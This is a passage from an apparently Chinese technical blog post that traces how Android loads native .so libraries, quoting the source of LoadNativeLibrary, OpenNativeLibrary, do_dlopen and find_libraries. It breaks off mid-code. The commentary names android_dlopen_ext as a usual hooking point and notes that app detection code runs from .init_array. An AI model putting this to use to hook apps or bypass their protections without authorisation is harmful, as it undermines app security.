*Locks::jni_libraries_lock_);    library = libraries_-&gt;Get(path);    if (library == nullptr) &#123;  // We won race to get libraries_lock.      library = new_library.release();      libraries_-&gt;Put(path, library);      created_library = true;    &#125;  &#125;  if (!created_library) &#123;    LOG(INFO) &lt;&lt; &quot;WOW: we lost a race to add shared library: &quot;        &lt;&lt; &quot;\&quot;&quot; &lt;&lt; path &lt;&lt; &quot;\&quot; ClassLoader=&quot; &lt;&lt; class_loader;    return library-&gt;CheckOnLoadResult();  &#125;  VLOG(jni) &lt;&lt; &quot;[Added shared library \&quot;&quot; &lt;&lt; path &lt;&lt; &quot;\&quot; for ClassLoader &quot; &lt;&lt; class_loader &lt;&lt; &quot;]&quot;;  bool was_successful = false;  void* sym = library-&gt;FindSymbol(&quot;JNI_OnLoad&quot;, nullptr, android::kJNICallTypeRegular);  if (sym == nullptr) &#123;    VLOG(jni) &lt;&lt; &quot;[No JNI_OnLoad found in \&quot;&quot; &lt;&lt; path &lt;&lt; &quot;\&quot;]&quot;;    was_successful = true;  &#125; else &#123;    // Call JNI_OnLoad.  We have to override the current class    // loader, which will always be &quot;null&quot; since the stuff at the    // top of the stack is around Runtime.loadLibrary().  (See    // the comments in the JNI FindClass function.)    ScopedLocalRef&lt;jobject&gt; old_class_loader(env, env-&gt;NewLocalRef(self-&gt;GetClassLoaderOverride()));    self-&gt;SetClassLoaderOverride(class_loader);    VLOG(jni) &lt;&lt; &quot;[Calling JNI_OnLoad in \&quot;&quot; &lt;&lt; path &lt;&lt; &quot;\&quot;]&quot;;    using JNI_OnLoadFn = int(*)(JavaVM*, void*);    JNI_OnLoadFn jni_on_load = reinterpret_cast&lt;JNI_OnLoadFn&gt;(sym);    int version = (*jni_on_load)(this, nullptr);    if (IsSdkVersionSetAndAtMost(runtime_-&gt;GetTargetSdkVersion(), SdkVersion::kL)) &#123;      // Make sure that sigchain owns SIGSEGV.      EnsureFrontOfChain(SIGSEGV);    &#125;    self-&gt;SetClassLoaderOverride(old_class_loader.get());    if (version == JNI_ERR) &#123;      StringAppendF(error_msg, &quot;JNI_ERR returned from JNI_OnLoad in \&quot;%s\&quot;&quot;, path.c_str());    &#125; else if (JavaVMExt::IsBadJniVersion(version)) &#123;      StringAppendF(error_msg, &quot;Bad JNI version returned from JNI_OnLoad in \&quot;%s\&quot;: %d&quot;,                    path.c_str(), version);      // It&#39;s unwise to call dlclose() here, but we can mark it      // as bad and ensure that future load attempts will fail.      // We don&#39;t know how far JNI_OnLoad got, so there could      // be some partially-initialized stuff accessible through      // newly-registered native method calls.  We could try to      // unregister them, but that doesn&#39;t seem worthwhile.    &#125; else &#123;      was_successful = true;    &#125;    VLOG(jni) &lt;&lt; &quot;[Returned &quot; &lt;&lt; (was_successful ? &quot;successfully&quot; : &quot;failure&quot;)              &lt;&lt; &quot; from JNI_OnLoad in \&quot;&quot; &lt;&lt; path &lt;&lt; &quot;\&quot;]&quot;;  &#125;  library-&gt;SetResult(was_successful);  return was_successful;&#125;</code></pre><p>​首先，该方法先进行初始化和查找已加载库，<strong>ART</strong> 会维护一个 libraries_ <strong>哈希表</strong>，记录已经成功加载的 native 库，通过该表来检查是否已经加载过（并加锁保护，防止多个线程同时加载同一库）；<strong>ScopedObjectAccess</strong> 用于安全访问 Java 对象，Decode 把 jobject 转成 ART 内部对象指针，然后获取 ClassLinker，再检查传进来的调用者 ClassLoader 是不是引导类加载器，为什么要做特殊处理？因为系统类加载器不记录 native 库，直接置为 nullptr；接着获取调用类所在的 Dex 文件位置，用于日志或调试；然后获取 ClassLoader 分配器，因为 ART 每个 ClassLoader 都有一个 <strong>allocator</strong>（内存分配标识），用于区分库属于哪个 ClassLoader（注：JNI 规范要求：<strong>同一个 native 库不能加载到不同的 ClassLoader</strong>），获取到了之后就会进行检查是否 重复加载，如果不一致，说明已经被加载过了，报错，如果一致，再检查 JNI_OnLoad 是否成功。</p><p>​解下来是核心逻辑，调用 <strong>OpenNativeLibrary</strong> ，内部会根据入参中的 <strong>class_loader</strong> 的 <strong>nativeLibraryPath(s)</strong>（通常是 <code>/data/app/.../lib/arm/</code> 或 <code>/system/lib/</code>）去找 .so 文件，最终会调用到 dlopen 来加载动态库，返回 <strong>so 文件的 dlopen 句柄</strong>，如果加载失败，错误信息会写到 error_msg 中，这里没有 dlclose，注释里也解释清楚了，因为 ART&#x2F;Java 默认不支持类卸载，所以即使 classloader 被 GC 回收，库也不会 dlclose，因此 so 文件一旦加载成功，就常驻进程，直到进程退出；后续的逻辑会为每个 so 文件生成一个 SharedLibrary 对象，保存 path、dlopen 句柄、class_loader、是否需要 native bridge（比如 32bit &lt;-&gt; 64bit 兼容），并放到 libraries_ 这个全局表里，保证重复加载时能复用；然后调用 JNI_OnLoad，从已加载的 so 库中寻找有没有 JNI_OnLoad 函数，有的话就直接调用，最后便是设置结果并返回。继续跟进 OpenNativeLibrary 函数。</p><pre><code class="language-C++">void* OpenNativeLibrary(JNIEnv* env,                        int32_t target_sdk_version,                        const char* path,                        jobject class_loader,                        const char* caller_location,                        jstring library_path_j,                        bool* needs_native_bridge,                        char** error_msg) &#123;#if defined(ART_TARGET_ANDROID)  if (class_loader == nullptr) &#123;    // class_loader is null only for the boot class loader (see    // IsBootClassLoader call in JavaVMExt::LoadNativeLibrary), i.e. the caller    // is in the boot classpath.    *needs_native_bridge = false;    if (caller_location != nullptr) &#123;      std::optional&lt;NativeLoaderNamespace&gt; ns = FindApexNamespace(caller_location);      if (ns.has_value()) &#123;        const android_dlextinfo dlextinfo = &#123;            .flags = ANDROID_DLEXT_USE_NAMESPACE,            .library_namespace = ns.value().ToRawAndroidNamespace(),        &#125;;        void* handle = android_dlopen_ext(path, RTLD_NOW, &amp;dlextinfo);        char* dlerror_msg = handle == nullptr ? strdup(dlerror()) : nullptr;        ALOGD(&quot;Load %s using APEX ns %s for caller %s: %s&quot;,              path,              ns.value().name().c_str(),              caller_location,              dlerror_msg == nullptr ? &quot;ok&quot; : dlerror_msg);        if (dlerror_msg != nullptr) &#123;          *error_msg = dlerror_msg;        &#125;        return handle;      &#125;    &#125;    // Check if the library is in NATIVELOADER_DEFAULT_NAMESPACE_LIBS and should    // be loaded from the kNativeloaderExtraLibs namespace.    &#123;      Result&lt;void*&gt; handle = TryLoadNativeloaderExtraLib(path);      if (!handle.ok()) &#123;        *error_msg = strdup(handle.error().message().c_str());        return nullptr;      &#125;      if (handle.value() != nullptr) &#123;        return handle.value();      &#125;    &#125;    // Handle issue b/349878424.    static bool bypass_loading_for_b349878424 = ShouldBypassLoadingForB349878424();    if (bypass_loading_for_b349878424 &amp;&amp;        (strcmp(&quot;libsobridge.so&quot;, path) == 0 || strcmp(&quot;libwalkstack.so&quot;, path) == 0)) &#123;      // Load a different library to pretend the loading was successful. This      // allows the device to boot.      ALOGD(&quot;Loading libbase.so instead of %s due to b/349878424&quot;, path);      path = &quot;libbase.so&quot;;    &#125;    // Fall back to the system namespace. This happens for preloaded JNI    // libraries in the zygote.    void* handle = OpenSystemLibrary(path, RTLD_NOW);    char* dlerror_msg = handle == nullptr ? strdup(dlerror()) : nullptr;    ALOGD(&quot;Load %s using system ns (caller=%s): %s&quot;,          path,          caller_location == nullptr ? &quot;&lt;unknown&gt;&quot; : caller_location,          dlerror_msg == nullptr ? &quot;ok&quot; : dlerror_msg);    if (dlerror_msg != nullptr) &#123;      *error_msg = dlerror_msg;    &#125;    return handle;  &#125;  // If the caller is in any of the system image partitions and the library is  // in the same partition then load it without regards to public library  // restrictions. This is only done if the library is specified by an absolute  // path, so we don&#39;t affect the lookup process for libraries specified by name  // only.  if (caller_location != nullptr &amp;&amp;      // Apps in the partition may have their own native libraries which should      // be loaded with the app&#39;s classloader namespace, so only do this for      // libraries in the partition-wide lib(64) directories.      nativeloader::IsPartitionNativeLibPath(path) &amp;&amp;      // Don&#39;t do this if the system image is older than V, to avoid any compat      // issues with apps and shared libs in them.      android::modules::sdklevel::IsAtLeastV()) &#123;    nativeloader::ApiDomain caller_api_domain = nativeloader::GetApiDomainFromPath(caller_location);    if (caller_api_domain != nativeloader::API_DOMAIN_DEFAULT) &#123;      nativeloader::ApiDomain library_api_domain = nativeloader::GetApiDomainFromPath(path);      if (library_api_domain == caller_api_domain) &#123;        bool is_bridged = false;        if (library_path_j != nullptr) &#123;          ScopedUtfChars library_path_utf_chars(env, library_path_j);          if (library_path_utf_chars[0] != &#39;\0&#39;) &#123;            is_bridged = NativeBridgeIsPathSupported(library_path_utf_chars.c_str());          &#125;        &#125;        Result&lt;NativeLoaderNamespace&gt; ns = GetNamespaceForApiDomain(caller_api_domain, is_bridged);        if (!ns.ok()) &#123;          ALOGD(&quot;Failed to find ns for caller %s in API domain %d to load %s (is_bridged=%b): %s&quot;,                caller_location,                caller_api_domain,                path,                is_bridged,                ns.error().message().c_str());          *error_msg = strdup(ns.error().message().c_str());          return nullptr;        &#125;        *needs_native_bridge = ns.value().IsBridged();        Result&lt;void*&gt; handle = ns.value().Load(path);        ALOGD(&quot;Load %s using ns %s for caller %s in same partition (is_bridged=%b): %s&quot;,              path,              ns.value().name().c_str(),              caller_location,              is_bridged,              handle.ok() ? &quot;ok&quot; : handle.error().message().c_str());        if (!handle.ok()) &#123;          *error_msg = strdup(handle.error().message().c_str());          return nullptr;        &#125;        return handle.value();      &#125;    &#125;  &#125;  NativeLoaderNamespace* ns;  const char* ns_descr;  &#123;    std::lock_guard&lt;std::mutex&gt; guard(g_namespaces_mutex);    ns = g_namespaces-&gt;FindNamespaceByClassLoader(env, class_loader);    ns_descr = &quot;class loader&quot;;    if (ns == nullptr) &#123;      // This is the case where the classloader was not created by ApplicationLoaders      // In this case we create an isolated not-shared namespace for it.      const std::string empty_dex_path;      Result&lt;NativeLoaderNamespace*&gt; res =          CreateClassLoaderNamespaceLocked(env,                                           target_sdk_version,                                           class_loader,                                           nativeloader::API_DOMAIN_DEFAULT,                                           /*is_shared=*/false,                                           empty_dex_path,                                           library_path_j,                                           /*permitted_path_j=*/nullptr,                                           /*uses_library_list_j=*/nullptr);      if (!res.ok()) &#123;        ALOGD(&quot;Failed to create isolated ns for %s (caller=%s)&quot;,              path,              caller_location == nullptr ? &quot;&lt;unknown&gt;&quot; : caller_location);        *error_msg = strdup(res.error().message().c_str());        return nullptr;      &#125;      ns = res.value();      ns_descr = &quot;isolated&quot;;    &#125;  &#125;  *needs_native_bridge = ns-&gt;IsBridged();  Result&lt;void*&gt; handle = ns-&gt;Load(path);  ALOGD(&quot;Load %s using %s ns %s (caller=%s): %s&quot;,        path,        ns_descr,        ns-&gt;name().c_str(),        caller_location == nullptr ? &quot;&lt;unknown&gt;&quot; : caller_location,        handle.ok() ? &quot;ok&quot; : handle.error().message().c_str());  if (!handle.ok()) &#123;    *error_msg = strdup(handle.error().message().c_str());    return nullptr;  &#125;  return handle.value();#else   // !ART_TARGET_ANDROID  UNUSED(env, target_sdk_version, class_loader, caller_location);  // Do some best effort to emulate library-path support. It will not  // work for dependencies.  //  // Note: null has a special meaning and must be preserved.  std::string library_path;  // Empty string by default.  if (library_path_j != nullptr &amp;&amp; path != nullptr &amp;&amp; path[0] != &#39;/&#39;) &#123;    ScopedUtfChars library_path_utf_chars(env, library_path_j);    library_path = library_path_utf_chars.c_str();  &#125;  std::vector&lt;std::string&gt; library_paths = base::Split(library_path, &quot;:&quot;);  for (const std::string&amp; lib_path : library_paths) &#123;    *needs_native_bridge = false;    const char* path_arg;    std::string complete_path;    if (path == nullptr) &#123;      // Preserve null.      path_arg = nullptr;    &#125; else &#123;      complete_path = lib_path;      if (!complete_path.empty()) &#123;        complete_path.append(&quot;/&quot;);      &#125;      complete_path.append(path);      path_arg = complete_path.c_str();    &#125;    void* handle = dlopen(path_arg, RTLD_NOW);    if (handle != nullptr) &#123;      return handle;    &#125;    if (NativeBridgeIsSupported(path_arg)) &#123;      *needs_native_bridge = true;      handle = NativeBridgeLoadLibrary(path_arg, RTLD_NOW);      if (handle != nullptr) &#123;        return handle;      &#125;      *error_msg = strdup(NativeBridgeGetError());    &#125; else &#123;      *error_msg = strdup(dlerror());    &#125;  &#125;  return nullptr;#endif  // !ART_TARGET_ANDROID&#125;</code></pre><p>​总的来说该函数的作用就是根据传入的 class_loader &#x2F; caller_location &#x2F; library_path_j 等上下文，选择合适的 native loader namespace，然后最终调用 dlopen（或 android_dlopen_ext &#x2F; native-bridge）加载目标 .so，返回 dlopen 的句柄。而这里的 <strong>android_dlopen_ext</strong> 函数也就是经常进行 Hook 的位置了。跟进。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250909165103651.png" alt="image-20250909165103651"></p><p>​根据看雪的那篇文章中所提及的，在 Android 12 中会直接调用到 <strong>__loader_android_dlopen_ext</strong> 函数，而在其他版本会调转到 <strong>mock-&gt;mock_dlopen_ext</strong> （如上图，会模拟 dlopen 的行为，同时通过 flag 和宏定义走到不同的函数位置）。</p><p>​这里我们固定在 Android 12 的位置去实现。代码如下</p><pre><code class="language-c++">void* __loader_android_dlopen_ext(const char* filename,                           int flags,                           const android_dlextinfo* extinfo,                           const void* caller_addr) &#123;  return dlopen_ext(filename, flags, extinfo, caller_addr);&#125;</code></pre><p>​跟进 <strong>dlopen_ext</strong> 函数。</p><pre><code class="language-c++">static void* dlopen_ext(const char* filename,                        int flags,                        const android_dlextinfo* extinfo,                        const void* caller_addr) &#123;  ScopedPthreadMutexLocker locker(&amp;g_dl_mutex);  g_linker_logger.ResetState();  void* result = do_dlopen(filename, flags, extinfo, caller_addr);  if (result == nullptr) &#123;    __bionic_format_dlerror(&quot;dlopen failed&quot;, linker_get_error_buffer());    return nullptr;  &#125;  return result;&#125;</code></pre><p>​同样进入 do_dlopen(filename, flags, extinfo, caller_addr)，在这个函数中附加了很多对于 do_dlopen 函数参数的检测和判断。</p><pre><code class="language-c++">void* do_dlopen(const char* name, int flags,                const android_dlextinfo* extinfo,                const void* caller_addr) &#123;  std::string trace_prefix = std::string(&quot;dlopen: &quot;) + (name == nullptr ? &quot;(nullptr)&quot; : name);  ScopedTrace trace(trace_prefix.c_str());  ScopedTrace loading_trace((trace_prefix + &quot; - loading and linking&quot;).c_str());  soinfo* const caller = find_containing_library(caller_addr);  android_namespace_t* ns = get_caller_namespace(caller);  LD_LOG(kLogDlopen,         &quot;dlopen(name=\&quot;%s\&quot;, flags=0x%x, extinfo=%s, caller=\&quot;%s\&quot;, caller_ns=%s@%p, targetSdkVersion=%i) ...&quot;,         name,         flags,         android_dlextinfo_to_string(extinfo).c_str(),         caller == nullptr ? &quot;(null)&quot; : caller-&gt;get_realpath(),         ns == nullptr ? &quot;(null)&quot; : ns-&gt;get_name(),         ns,         get_application_target_sdk_version());  auto purge_guard = android::base::make_scope_guard([&amp;]() &#123; purge_unused_memory(); &#125;);  auto failure_guard = android::base::make_scope_guard(      [&amp;]() &#123; LD_LOG(kLogDlopen, &quot;... dlopen failed: %s&quot;, linker_get_error_buffer()); &#125;);  if ((flags &amp; ~(RTLD_NOW|RTLD_LAZY|RTLD_LOCAL|RTLD_GLOBAL|RTLD_NODELETE|RTLD_NOLOAD)) != 0) &#123;    DL_OPEN_ERR(&quot;invalid flags to dlopen: %x&quot;, flags);    return nullptr;  &#125;  if (extinfo != nullptr) &#123;    if ((extinfo-&gt;flags &amp; ~(ANDROID_DLEXT_VALID_FLAG_BITS)) != 0) &#123;      DL_OPEN_ERR(&quot;invalid extended flags to android_dlopen_ext: 0x%&quot; PRIx64, extinfo-&gt;flags);      return nullptr;    &#125;    if ((extinfo-&gt;flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD) == 0 &amp;&amp;        (extinfo-&gt;flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD_OFFSET) != 0) &#123;      DL_OPEN_ERR(&quot;invalid extended flag combination (ANDROID_DLEXT_USE_LIBRARY_FD_OFFSET without &quot;          &quot;ANDROID_DLEXT_USE_LIBRARY_FD): 0x%&quot; PRIx64, extinfo-&gt;flags);      return nullptr;    &#125;    if ((extinfo-&gt;flags &amp; ANDROID_DLEXT_USE_NAMESPACE) != 0) &#123;      if (extinfo-&gt;library_namespace == nullptr) &#123;        DL_OPEN_ERR(&quot;ANDROID_DLEXT_USE_NAMESPACE is set but extinfo-&gt;library_namespace is null&quot;);        return nullptr;      &#125;      ns = extinfo-&gt;library_namespace;    &#125;  &#125;  // Workaround for dlopen(/system/lib/&lt;soname&gt;) when .so is in /apex. http://b/121248172  // The workaround works only when targetSdkVersion &lt; Q.  std::string name_to_apex;  if (translateSystemPathToApexPath(name, &amp;name_to_apex)) &#123;    const char* new_name = name_to_apex.c_str();    LD_LOG(kLogDlopen, &quot;dlopen considering translation from %s to APEX path %s&quot;,           name,           new_name);    // Some APEXs could be optionally disabled. Only translate the path    // when the old file is absent and the new file exists.    // TODO(b/124218500): Re-enable it once app compat issue is resolved    /*    if (file_exists(name)) &#123;      LD_LOG(kLogDlopen, &quot;dlopen %s exists, not translating&quot;, name);    &#125; else    */    if (!file_exists(new_name)) &#123;      LD_LOG(kLogDlopen, &quot;dlopen %s does not exist, not translating&quot;,             new_name);    &#125; else &#123;      LD_LOG(kLogDlopen, &quot;dlopen translation accepted: using %s&quot;, new_name);      name = new_name;    &#125;  &#125;  // End Workaround for dlopen(/system/lib/&lt;soname&gt;) when .so is in /apex.  std::string translated_name_holder;  assert(!g_is_hwasan || !g_is_asan);  const char* translated_name = name;  if (g_is_asan &amp;&amp; translated_name != nullptr &amp;&amp; translated_name[0] == &#39;/&#39;) &#123;    char original_path[PATH_MAX];    if (realpath(name, original_path) != nullptr) &#123;      translated_name_holder = std::string(kAsanLibDirPrefix) + original_path;      if (file_exists(translated_name_holder.c_str())) &#123;        soinfo* si = nullptr;        if (find_loaded_library_by_realpath(ns, original_path, true, &amp;si)) &#123;          DL_WARN(&quot;linker_asan dlopen NOT translating \&quot;%s\&quot; -&gt; \&quot;%s\&quot;: library already loaded&quot;, name,                  translated_name_holder.c_str());        &#125; else &#123;          DL_WARN(&quot;linker_asan dlopen translating \&quot;%s\&quot; -&gt; \&quot;%s\&quot;&quot;, name, translated_name);          translated_name = translated_name_holder.c_str();        &#125;      &#125;    &#125;  &#125; else if (g_is_hwasan &amp;&amp; translated_name != nullptr &amp;&amp; translated_name[0] == &#39;/&#39;) &#123;    char original_path[PATH_MAX];    if (realpath(name, original_path) != nullptr) &#123;      // Keep this the same as CreateHwasanPath in system/linkerconfig/modules/namespace.cc.      std::string path(original_path);      auto slash = path.rfind(&#39;/&#39;);      if (slash != std::string::npos || slash != path.size() - 1) &#123;        translated_name_holder = path.substr(0, slash) + &quot;/hwasan&quot; + path.substr(slash);      &#125;      if (!translated_name_holder.empty() &amp;&amp; file_exists(translated_name_holder.c_str())) &#123;        soinfo* si = nullptr;        if (find_loaded_library_by_realpath(ns, original_path, true, &amp;si)) &#123;          DL_WARN(&quot;linker_hwasan dlopen NOT translating \&quot;%s\&quot; -&gt; \&quot;%s\&quot;: library already loaded&quot;,                  name, translated_name_holder.c_str());        &#125; else &#123;          DL_WARN(&quot;linker_hwasan dlopen translating \&quot;%s\&quot; -&gt; \&quot;%s\&quot;&quot;, name, translated_name);          translated_name = translated_name_holder.c_str();        &#125;      &#125;    &#125;  &#125;  ProtectedDataGuard guard;  soinfo* si = find_library(ns, translated_name, flags, extinfo, caller);  loading_trace.End();  if (si != nullptr) &#123;    void* handle = si-&gt;to_handle();    LD_LOG(kLogDlopen,           &quot;... dlopen calling constructors: realpath=\&quot;%s\&quot;, soname=\&quot;%s\&quot;, handle=%p&quot;,           si-&gt;get_realpath(), si-&gt;get_soname(), handle);    si-&gt;call_constructors();    failure_guard.Disable();    LD_LOG(kLogDlopen,           &quot;... dlopen successful: realpath=\&quot;%s\&quot;, soname=\&quot;%s\&quot;, handle=%p&quot;,           si-&gt;get_realpath(), si-&gt;get_soname(), handle);    return handle;  &#125;  return nullptr;&#125;int do_dladdr(const void* addr, Dl_info* info) &#123;  // Determine if this address can be found in any library currently mapped.  soinfo* si = find_containing_library(addr);  if (si == nullptr) &#123;    return 0;  &#125;  memset(info, 0, sizeof(Dl_info));  info-&gt;dli_fname = si-&gt;get_realpath();  // Address at which the shared object is loaded.  info-&gt;dli_fbase = reinterpret_cast&lt;void*&gt;(si-&gt;base);  // Determine if any symbol in the library contains the specified address.  ElfW(Sym)* sym = si-&gt;find_symbol_by_address(addr);  if (sym != nullptr) &#123;    info-&gt;dli_sname = si-&gt;get_string(sym-&gt;st_name);    info-&gt;dli_saddr = reinterpret_cast&lt;void*&gt;(si-&gt;resolve_symbol_address(sym));  &#125;  return 1;&#125;static soinfo* soinfo_from_handle(void* handle) &#123;  if ((reinterpret_cast&lt;uintptr_t&gt;(handle) &amp; 1) != 0) &#123;    auto it = g_soinfo_handles_map.find(reinterpret_cast&lt;uintptr_t&gt;(handle));    if (it == g_soinfo_handles_map.end()) &#123;      return nullptr;    &#125; else &#123;      return it-&gt;second;    &#125;  &#125;  return static_cast&lt;soinfo*&gt;(handle);&#125;</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250909165939099.png" alt="image-20250909165939099"></p><p>​首先对 flags 进行校验，然后大面积的对传入的 extinfo 进行检查，接着对 APEX 路径进行翻译；调用 find_library 查找并加载库，即在 namespace 下查找库是否已加载，如果未加载，则解析 ELF、执行 mmap、解析依赖，返回 <code>soinfo*</code>（库的内部结构，包括基址、soname、symbols）；然后调用构造函数，也就是对库的 <strong>.init_array</strong> 执行初始化函数（包括 JNI_OnLoad 会在上层封装调用），很多检测逻辑就会在写在这个段，在 JNI_OnLoad 函数之前运行。继续跟进 find_library(ns, translated_name, flags, extinfo, caller)。</p><pre><code class="language-c++">static soinfo* find_library(android_namespace_t* ns,                            const char* name, int rtld_flags,                            const android_dlextinfo* extinfo,                            soinfo* needed_by) &#123;  soinfo* si = nullptr;  if (name == nullptr) &#123;    si = solist_get_somain();  &#125; else if (!find_libraries(ns,                             needed_by,                             &amp;name,                             1,                             &amp;si,                             nullptr,                             0,                             rtld_flags,                             extinfo,                             false /* add_as_children */)) &#123;    if (si != nullptr) &#123;      soinfo_unload(si);    &#125;    return nullptr;  &#125;  si-&gt;increment_ref_count();  return si;&#125;</code></pre><p>直接继续跟进 find_libraries 函数</p><pre><code class="language-c++">bool find_libraries(android_namespace_t* ns,                    soinfo* start_with,                    const char* const library_names[],                    size_t library_names_count,                    soinfo* soinfos[],                    std::vector&lt;soinfo*&gt;* ld_preloads,                    size_t ld_preloads_count,                    int rtld_flags,                    const android_dlextinfo* extinfo,                    bool add_as_children,                    std::vector&lt;android_namespace_t*&gt;* namespaces) &#123;  // Step 0: prepare.  std::unordered_map&lt;const soinfo*, ElfReader&gt; readers_map;  LoadTaskList load_tasks;  for (size_t i = 0; i &lt; library_names_count; ++i) &#123;    const char* name = library_names[i];    load_tasks.push_back(LoadTask::create(name, start_with, ns, &amp;readers_map));  &#125;  // If soinfos array is null allocate one on stack.  // The array is needed in case of failure; for example  // when library_names[] = &#123;libone.so, libtwo.so&#125; and libone.so  // is loaded correctly but libtwo.so failed for some reason.  // In this case libone.so should be unloaded on return.  // See also implementation of failure_guard below.  if (soinfos == nullptr) &#123;    size_t soinfos_size = sizeof(soinfo*)*library_names_count;    soinfos = reinterpret_cast&lt;soinfo**&gt;(alloca(soinfos_size));    memset(soinfos, 0, soinfos_size);  &#125;  // list of libraries to link - see step 2.  size_t soinfos_count = 0;  auto scope_guard = android::base::make_scope_guard([&amp;]() &#123;    for (LoadTask* t : load_tasks) &#123;      LoadTask::deleter(t);    &#125;  &#125;);  ZipArchiveCache zip_archive_cache;  soinfo_list_t new_global_group_members;  // Step 1: expand the list of load_tasks to include  // all DT_NEEDED libraries (do not load them just yet)  for (size_t i = 0; i&lt;load_tasks.size(); ++i) &#123;    LoadTask* task = load_tasks[i];    soinfo* needed_by = task-&gt;get_needed_by();    bool is_dt_needed = needed_by != nullptr &amp;&amp; (needed_by != start_with || add_as_children);    task-&gt;set_extinfo(is_dt_needed ? nullptr : extinfo);    task-&gt;set_dt_needed(is_dt_needed);    // Note: start from the namespace that is stored in the LoadTask. This namespace    // is different from the current namespace when the LoadTask is for a transitive    // dependency and the lib that created the LoadTask is not found in the    // current namespace but in one of the linked namespaces.    android_namespace_t* start_ns = const_cast&lt;android_namespace_t*&gt;(task-&gt;get_start_from());    LD_LOG(kLogDlopen, &quot;find_library_internal(ns=%s@%p): task=%s, is_dt_needed=%d&quot;,           start_ns-&gt;get_name(), start_ns, task-&gt;get_name(), is_dt_needed);    if (!find_library_internal(start_ns, task, &amp;zip_archive_cache, &amp;load_tasks, rtld_flags)) &#123;      return false;    &#125;    soinfo* si = task-&gt;get_soinfo();    if (is_dt_needed) &#123;      needed_by-&gt;add_child(si);    &#125;    // When ld_preloads is not null, the first    // ld_preloads_count libs are in fact ld_preloads.    bool is_ld_preload = false;    if (ld_preloads != nullptr &amp;&amp; soinfos_count &lt; ld_preloads_count) &#123;      ld_preloads-&gt;push_back(si);      is_ld_preload = true;    &#125;    if (soinfos_count &lt; library_names_count) &#123;      soinfos[soinfos_count++] = si;    &#125;    // Add the new global group members to all initial namespaces. Do this secondary namespace setup    // at the same time that libraries are added to their primary namespace so that the order of    // global group members is the same in the every namespace. Only add a library to a namespace    // once, even if it appears multiple times in the dependency graph.    if (is_ld_preload || (si-&gt;get_dt_flags_1() &amp; DF_1_GLOBAL) != 0) &#123;      if (!si-&gt;is_linked() &amp;&amp; namespaces != nullptr &amp;&amp; !new_global_group_members.contains(si)) &#123;        new_global_group_members.push_back(si);        for (auto linked_ns : *namespaces) &#123;          if (si-&gt;get_primary_namespace() != linked_ns) &#123;            linked_ns-&gt;add_soinfo(si);            si-&gt;add_secondary_namespace(linked_ns);          &#125;        &#125;      &#125;    &#125;  &#125;  // Step 2: Load libraries in random order (see b/24047022)  LoadTaskList load_list;  for (auto&amp;&amp; task : load_tasks) &#123;    soinfo* si = task-&gt;get_soinfo();    auto pred = [&amp;](const LoadTask* t) &#123;      return t-&gt;get_soinfo() == si;    &#125;;    if (!si-&gt;is_linked() &amp;&amp;        std::find_if(load_list.begin(), load_list.end(), pred) == load_list.end() ) &#123;      load_list.push_back(task);    &#125;  &#125;  bool reserved_address_recursive = false;  if (extinfo) &#123;    reserved_address_recursive = extinfo-&gt;flags &amp; ANDROID_DLEXT_RESERVED_ADDRESS_RECURSIVE;  &#125;  if (!reserved_address_recursive) &#123;    // Shuffle the load order in the normal case, but not if we are loading all    // the libraries to a reserved address range.    shuffle(&amp;load_list);  &#125;  // Set up address space parameters.  address_space_params extinfo_params, default_params;  size_t relro_fd_offset = 0;  if (extinfo) &#123;    if (extinfo-&gt;flags &amp; ANDROID_DLEXT_RESERVED_ADDRESS) &#123;      extinfo_params.start_addr = extinfo-&gt;reserved_addr;      extinfo_params.reserved_size = extinfo-&gt;reserved_size;      extinfo_params.must_use_address = true;    &#125; else if (extinfo-&gt;flags &amp; ANDROID_DLEXT_RESERVED_ADDRESS_HINT) &#123;      extinfo_params.start_addr = extinfo-&gt;reserved_addr;      extinfo_params.reserved_size = extinfo-&gt;reserved_size;    &#125;  &#125;  for (auto&amp;&amp; task : load_list) &#123;    address_space_params* address_space =        (reserved_address_recursive || !task-&gt;is_dt_needed()) ? &amp;extinfo_params : &amp;default_params;    if (!task-&gt;load(address_space)) &#123;      return false;    &#125;  &#125;  // The WebView loader uses RELRO sharing in order to promote page sharing of the large RELRO  // segment, as it&#39;s full of C++ vtables. Because MTE globals, by default, applies random tags to  // each global variable, the RELRO segment is polluted and unique for each process. In order to  // allow sharing, but still provide some protection, we use deterministic global tagging schemes  // for DSOs that are loaded through android_dlopen_ext, such as those loaded by WebView.  bool dlext_use_relro =      extinfo &amp;&amp; extinfo-&gt;flags &amp; (ANDROID_DLEXT_WRITE_RELRO | ANDROID_DLEXT_USE_RELRO);  // Step 3: pre-link all DT_NEEDED libraries in breadth first order.  bool any_memtag_stack = false;  for (auto&amp;&amp; task : load_tasks) &#123;    soinfo* si = task-&gt;get_soinfo();    if (!si-&gt;is_linked() &amp;&amp; !si-&gt;prelink_image(dlext_use_relro)) &#123;      return false;    &#125;    // si-&gt;memtag_stack() needs to be called after si-&gt;prelink_image() which populates    // the dynamic section.    if (si-&gt;memtag_stack()) &#123;      any_memtag_stack = true;      LD_LOG(kLogDlopen,             &quot;... load_library requesting stack MTE for: realpath=\&quot;%s\&quot;, soname=\&quot;%s\&quot;&quot;,             si-&gt;get_realpath(), si-&gt;get_soname());    &#125;    register_soinfo_tls(si);  &#125;  if (any_memtag_stack) &#123;    if (auto* cb = __libc_shared_globals()-&gt;memtag_stack_dlopen_callback) &#123;      cb();    &#125; else &#123;      // find_library is used by the initial linking step, so we communicate that we      // want memtag_stack enabled to __libc_init_mte.      __libc_shared_globals()-&gt;initial_memtag_stack_abi = true;    &#125;  &#125;  // Step 4: Construct the global group. DF_1_GLOBAL bit is force set for LD_PRELOADed libs because  // they must be added to the global group. Note: The DF_1_GLOBAL bit for a library is normally set  // in step 3.  if (ld_preloads != nullptr) &#123;    for (auto&amp;&amp; si : *ld_preloads) &#123;      si-&gt;set_dt_flags_1(si-&gt;get_dt_flags_1() | DF_1_GLOBAL);    &#125;  &#125;  // Step 5: Collect roots of local_groups.  // Whenever needed_by-&gt;si link crosses a namespace boundary it forms its own local_group.  // Here we collect new roots to link them separately later on. Note that we need to avoid  // collecting duplicates. Also the order is important. They need to be linked in the same  // BFS order we link individual libraries.  std::vector&lt;soinfo*&gt; local_group_roots;  if (start_with != nullptr &amp;&amp; add_as_children) &#123;    local_group_roots.push_back(start_with);  &#125; else &#123;    CHECK(soinfos_count == 1);    